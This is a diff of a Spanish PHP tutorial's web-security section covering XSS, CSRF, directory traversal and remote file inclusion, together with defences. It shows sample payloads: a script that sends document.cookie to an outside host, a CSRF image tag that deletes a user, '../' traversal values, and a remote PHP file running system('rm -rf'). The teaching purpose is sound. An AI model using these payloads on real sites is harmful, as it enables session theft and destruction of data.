@@ -30,7 +30,7 @@ Las cookies son pequeños archivos de texto enviados desde el servidor que se al
 
 PHP soporta cookies de forma transparente. Se pueden configurar Cookies usando las funciones setcookie() o setrawcookie() y el array global $_COOKIE. 
 
-### 3.2.2. Menajando cookies con PHP
+### 3.2.2. Manejando cookies con PHP
 
 #### Enviar una cookie: setcookie()
 
@@ -249,65 +249,90 @@ Para blindarse frente a inyecciones de SQL, se recomienda:
 
 ### 3.5.3. XSS (cross site scripting)
 
-XXX
+El ataque por XSS consiste **ejecutar código de scripting malicioso** (básicamente, Javascript) en el contexto del sitio web.
 
-Las vulnerabilidades de XSS permiten ejecutar código de scripting en el contexto del sitio web:
+Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un portal tipo blog de noticias, y que un usuario malicioso publica, dentro del texto de una entrada, este string:
 
-    • Explotando la confianza que tiene un usuario de un sitio web. Puede que los usuarios no tengan un alto nivel de confianza en un sitio web, pero sí el navegador. Por ejemplo, cuando el navegador envía cookies en una petición.
-    • Haciendo que los sitios web muestren datos externos. Como aplicaciones de mayor riesgo que incluyen foros, clientes de correo web, o contenido de RSS.
-    • Cuando los datos externos no se filtran adecuadamente un atacante puede inyectar un contenido. Esto es tan peligroso como dejar que el atacante edite código en el servidor.
+```javascript
+<script>document.href = 'https://otrositio.com';</script>
+```
 
-Un usuario que ejecute este código con JavaScript activado en su navegador será redireccionado a evil.example.org, y las cookies asociadas al sitio web serán incluidas en la consulta:
+¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a otrosition.com, donde probablemente pretenderán vendernos medicamentos de dudosa procedencia o algo por el estilo.
 
-<script>document.locationn = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script>
+Otra cosa que suele hacerse con XSS es robar datos de las cookies del cliente. Para ello, el atacante solo tiene que inyectar un código como este:
 
-Se recomienda:
+```javascript
+<script>document.location = 'https://otrositio.com?cookies=' + document.cookie</script>
+```
 
-    • **Filtrar todos los datos externos. El filtrado de datos es la práctica más importante que se puede adoptar. Al validar todos los datos externos a medida que entran y salen de la aplicación se mitigarán la mayoría de las preocupaciones del XSS.
-    • Utilizar las funciones que tiene PHP que ayudan al filtrado. Pueden ser útiles htmlentities () que convierte caracteres a entidades HTML, strip_tags () que elimina las etiquetas HTML y PHP de una cadena y utf8_decode ().
-    • Basarse en listas blancas. Supongamos que los datos no son válidos hasta que no se pruebe que lo son. Esto implica verificar la longitud y asegurar que sólo los caracteres válidos son permitidos. Por ejemplo, si se inserta el nombre y apellidos, se debe asegurar que sólo se permiten letras y espacios. Por ejemplo Berners-Lee se consideraría nula, pero esto se puede arreglar añadiendo este nombre a la lista blanca. Es mejor rechazar datos válidos que aceptar datos maliciosos.
-    • Utilizar una convención de nomenclatura estricta. Una convención de nomenclatura puede ayudar a los desarrolladores a distinguir entre datos filtrados y sin filtrar.
+Para evitar los ataques XSS, la estrategias más útil, otra vez, es **filtrar todos los datos externos**. El filtrado de datos es la práctica más importante que se puede adoptar: nunca te fíes de ningún dato que provenga de un formulario.
 
-### 3.5.4. CSRF (cross site request forgery)
+### 3.5.4. CSRF o XSRF (cross site request forgery)
 
-Explota la confianza que tiene un sitio web en la identidad de un usuario.
+Este tipo de ataques **explota la confianza que tiene un sitio web en la identidad de un usuario**. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com) se le fuerza a hacer algo chungo en sitio-confiable.com.
 
-Un ejemplo sería enviar los siguientes datos en la petición:
+Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario).
 
-GET /buy.php?symbol=SCOX&quantity=1000 HTTP/1.1
-Host: stocks.example.org
-User-Agent: Mozilla/5.0 Gecko
-Accept: text/xml, image/png, image/jpeg, image/gif, */*
-Cookie: PHPSESSID=1234
+Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante súpermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com:
 
-Se recomienda:
+```html
+<img src='https://sitio-confiable.com/usuario/delete/28'>
+```
 
-    • Utilizar POST en lugar de GET en los formularios. Sobre todo cuando se esté realizando una acción que involucra una compra.
-    • Utilizar $_POST en lugar de confiar en register_globals. Utilizar el método POST es inútil si se confía en register_globals y se referencian variables como $symbol o $quantity. Lo mismo sucede si se utiliza $_REQUEST.
-    • Generar un token único para cada petición y verificarlo posteriormente.
+Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia.
+
+Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legímito.
+
+Algunas técnicas para dificultar el ataque por CSRF:
+
+* **Utilizar POST en lugar de GET** para recibir datos.
+* **Generar tokens únicos para cada petición**. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas.
 
 ### 3.5.5. DT (directory transversal)
 
-Este ataque se produce cuando se especifican rutas de ficheros como "../../../../file" en los datos del formulario y mediante un script se llama a estos ficheros, proporcionando a un atacante la posibilidad de realizar cambios en el sistema de ficheros.
+Este ataque se produce cuando el atacante logra **acceder a ficheros del servidor que están fuera del directorio de la aplicación** y que, teóricamente, no deberían ser accesibles desde esta.
 
-Si dentro del script de PHP se incluye algo como require $page . '.php'; sabiendo que esta página se almacena en /home/someone/public_html/index.php, un atacante podría hacer index.php?page=../secret accediendo a /home/someone/secret.php
+Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un include de este estilo:
 
-Se recomienda:
+```php
+include ("views/" . $viewName);
+```
 
-    • Tener un array de páginas válidas.
-    • Comprobar que el archivo solicitado coincide con un formato concreto.
+Si un atacante logra manipular la variable $viewName para asignarle, por ejemplo, el valor "../../../../otro-fichero.php", nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación.
+
+Para evitar este tipo de ataques, algunas estrategias son:
+
+* **Tener un array de páginas válidas**. Si un include trata de usar un fichero que no está en la lista, se sospechará de un ataque.
+* **Buscar caracteres sospechosos en los nombres de los archivos**. Si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".
+
 
 ### 3.5.6. RFI (remote file inclusion)
 
-Como su nombre indica, se produce cuando se incluye un archivo remoto.
+Este ataque se produce cuando **se incluye un archivo remoto** explotando una vulnerabilidad del código fuente.
 
-Por ejemplo, si existe un archivo en la ruta http://example.com/malice.php y nuestro script se encuentra en http://site.com/index.php. Un atacante puede hacer esta petición: http://site.com/index.php?page=http://example.com/malice lo que provocará que el archivo se ejecute y escriba un nuevo fichero en disco, pudiendo ser este fichero una shell que permita la ejecución de comandos.
+Imagina, como antes, un programa PHP que haga un include tan común como este:
 
-O, por ejemplo, se podría asignar a page el valor http://example.com/malice.php? seguido de una consulta a base de datos.
+```php
+include ("views/" . $viewName);
+```
 
-Se recomienda:
+Imagina también que este código se invoque mediante una petición del estilo: https://sitio-confiable.com?view=main.php, algo perfectamente posible.
 
-    • No confiar en los datos que no provengan de nuestro sistema.
-    • Se deben validar los datos que introduce el usuario.
+Pues bien, un atacante puede hacer lo siguiente: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php
+
+De ese modo, la aplicación cargará el código soy-un-script-malvado.php y lo ejecutará en el servidor sitio-confiable.com. Este código puede entonces hacer cosas terribles, como esta:
+
+```php
+<?php
+  system("rm -rf");
+?>
+```
+
+(No te digo lo que hace por si se te ocurre probarlo)
+
+Para prevenir los ataques por RFI, algunas estrategias válidas son:
+
+* **No confiar en los datos** que no provengan de nuestro sistema.
+* **Validar y filtrar los datos** que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).
 
 
